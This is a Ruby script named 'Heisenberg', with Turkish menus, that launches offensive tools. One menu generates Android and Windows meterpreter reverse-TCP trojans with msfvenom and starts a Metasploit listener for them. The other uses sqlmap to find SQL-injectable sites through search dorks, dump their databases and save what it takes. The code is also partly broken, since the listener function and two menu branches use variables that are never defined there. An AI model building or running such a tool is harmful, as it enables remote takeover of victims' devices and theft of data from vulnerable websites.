require "colorize"
require "os"

a = OS.linux?
b = OS.windows?

if a == true
    system("clear")
elsif b == true
    system("cls")
end

if a == true
    system("figlet Heisenberg")
else
    puts"
██╗  ██╗███████╗██╗███████╗███████╗███╗   ██╗██████╗ ███████╗██████╗  ██████╗ 
██║  ██║██╔════╝██║██╔════╝██╔════╝████╗  ██║██╔══██╗██╔════╝██╔══██╗██╔════╝ 
███████║█████╗  ██║███████╗█████╗  ██╔██╗ ██║██████╔╝█████╗  ██████╔╝██║  ███╗
██╔══██║██╔══╝  ██║╚════██║██╔══╝  ██║╚██╗██║██╔══██╗██╔══╝  ██╔══██╗██║   ██║
██║  ██║███████╗██║███████║███████╗██║ ╚████║██████╔╝███████╗██║  ██║╚██████╔╝
╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ 
BY : QUEY7Z   |  TERMUX - LİNUX - WİNDOWS KULLANCILARI İÇİN TASARLANDI.
================================================================================="
end

def dinleme
    dosya = File.open("dinleme_ayarlari.txt", "w")
            dosya.write("set lhost #{lhost}")
            dosya.write("\nset lport #{lport}")
            dosya.write("\nset payload #{payload}")
            dosya.write("\nuse exploit/multi/handler")
            dosya.write("\nexploit")
            dosya.close()
            system("msfconsole -r dinleme_ayarlari.txt")
end
def msfvenom
    sistem = OS.windows?
    sistem2 = OS.linux?
    uyari = "MSFCONSOLE ARAÇLARI SADECE LİNUX VE TERMUX KULLANICILARI İÇİNDİR. WİNDOWS KULLANICILARI YARARLANAMAZ.".red
    system("clear")
    system("cls")
    if sistem == true
        system("cls")
        puts uyari
        sleep(3)

    elsif sistem == false
        puts"
    Trojan Türü
    1) APK
    2) WİNDOWS X86
    3) WİNDOWS X64
        ".yellow

        print"İşlem : ".green
        islem = gets.chop().to_i

        if islem == 1
            payload = "android/meterpreter/reverse_tcp"
            print "LHOST : ".green
            lhost=gets.chop

            print "LPORT : ".green
            lport = gets.chop

            print "Kaydedilecek dizin : ".green
            dizin = gets.chop

            system("msfvenom -p #{payload} LHOST=#{lhost} LPORT=#{lport} R > #{dizin}")
            print "Trojan dinlemeye alınsın mı (e/h) : ".yellow
            eh = gets.chop
            if eh == "e"
                dinleme
            end

        elsif islem == 2
            payload = "windows/x86/meterpreter/reverse_tcp"
            print "LHOST : ".green
            lhost=gets.chop

            print "LPORT : ".green
            lport = gets.chop

            print "Kaydedilecek dizin : ".green
            dizin = gets.chop

            system("msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe -o #{dizin}")
            if eh == "e"
                dinleme
            end
            
        elsif islem == 3
            payload = "windows/x64/meterpreter/reverse_tcp"
            print "LHOST : ".green
            lhost=gets.chop

            print "LPORT : ".green
            lport = gets.chop

            print "Kaydedilecek dizin : ".green
            dizin = gets.chop

            system("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe -o #{dizin}")
            if eh == "e"
                dinleme
            end
        else
            system("cls")
        end
    end
end

def sqlmap
    system("cls")
    system("clear")
    while 6
        puts "
1) Windows / Termux
2) Linux
        ".yellow

        print "Kullandığınız işletim sistemini seçin : ".green
        isletim = gets.chop

    if isletim == "1"
        system("cls")
        puts "NOT : SQLMAP'İ İNDİRİN VE HEİSENBERG YAZILIMINI SQLMAP.PY DOSYASIYLA AYNI KONUMA ATIN. ARDINDAN PROGRAMI TEKRAR BAŞLATIN. (OTOMATİK MESAJDIR, SÖYLENENLERİ YAPSANIZ BİLE GÖSTERİLECEKTİR.)".red
        puts "NOT : PYTHON2 İNDİRİN.".red
        puts "
1) SQL açıklı site tarama
2) SQL açıklı siteyi dork yardımıyla bulma (dork search)
3) TXT dosyasındaki birden fazla siteleri tarama
        ".yellow

        print "İşlem : ".green
        islemm = gets.chop

        if islemm == "1"
            system("cls")
            print "Link : ".yellow
            acikli_link = gets.chop
            system("python2 sqlmap.py -u #{acikli_link} --dbs --random-agent")
            print "Database : ".yellow
            database = gets.chop
            system ("python2 sqlmap.py -u #{acikli_link} -D #{database} --tables --random-agent")
            print "Table : ".yellow
            table = gets.chop
            system("python2 sqlmap.py -u #{acikli_link} -D #{database} -T #{table} --columns --random-agent")
            print "Column(s) : ".yellow
            column = gets.chop
            system("python2 sqlmap.py -u #{acikli_link} -D #{database} -T #{table} -C #{column} --dump --random-agent")
            print "Bilgiler kaydedilsin mi (e/h) : ".yellow
            kaydet = gets.chop
            if kaydet == "e"
                begin
                    file = File.open("heisenberg_save/saved.txt", "w")
                    file.puts("
Site : #{acikli_link}
Database : #{database}
Table : #{table}
Column(s) : #{column}
                    ")
                    file.close
                    sleep(2)
                rescue
                    puts "Lütfen heisenberg.rb'nin olduğu yerde heisenberg_save isimli klasör oluşturun.".red
                    sleep(2)
                end
            end
        
        elsif islemm == "2"
            system("cls")
            print "Dork : ".yellow
            dork = gets.chop
            system("python2 sqlmap.py -g #{dork}")
        
        elsif islemm == "3"
            system("cls")
            print "TXT (örnek D:\\Notlarım\\hedef.txt) : ".yellow
            hedef = gets.chop
            system("python2 sqlmap.py -m #{hedef}")
        end           

    elsif isletim == "2"
        system("clear")
        puts "
1) SQL açıklı site tarama
2) SQL açıklı siteyi dork yardımıyla bulma (dork search)
3) TXT dosyasındaki birden fazla siteleri tarama
        ".yellow

        print "İşlem : ".green
        islemm = gets.chop

        if islemm == "1"
            system("clear")
            print "Link : ".yellow
            acikli_link = gets.chop
            system("sqlmap.py -u #{acikli_link} --dbs --random-agent")
            print "Database : ".yellow
            database = gets.chop
            system ("sqlmap.py -u #{acikli_link} -D #{database} --tables --random-agent")
            print "Table : ".yellow
            table = gets.chop
            system("sqlmap.py -u #{acikli_link} -D #{database} -T #{table} --columns --random-agent")
            print "Column(s) : ".yellow
            column = gets.chop
            system("sqlmap.py -u #{acikli_link} -D #{database} -T #{table} -C #{column} --dump --random-agent")
            print "Bilgiler kaydedilsin mi (e/h) : ".yellow
            kaydet = gets.chop
            if kaydet == "e"
                begin
                    file = File.open("heisenberg_save/saved.txt", "w")
                    file.puts("
Site : #{acikli_link}
Database : #{database}
Table : #{table}
Column(s) : #{column}
                    ")
                    file.close
                    sleep(2)
                rescue
                    puts "Lütfen heisenberg.rb'nin olduğu yerde heisenberg_save isimli klasör oluşturun.".red
                    sleep(2)
                end
            end
            
        elsif islemm == "2"
            print "Dork : ".yellow
            dork = gets.chop
            system("sqlmap.py -g #{dork}")
        elsif islemm == "3"
            print "TXT (örnek D:\\Notlarım\\hedef.txt) : ".yellow
            hedef = gets.chop
            system("sqlmap.py -m #{hedef}")
        end
    else
        system("cls")
        system("clear")
        break
    end
    end
end


while 1
    puts "
1) SqlMap araçları
2) Msfconsole araçları
".yellow

    print "İşlem : ".green
    islem = gets.chop
    if islem == "2"
        msfvenom
    elsif islem == "1"
        sqlmap
    end

end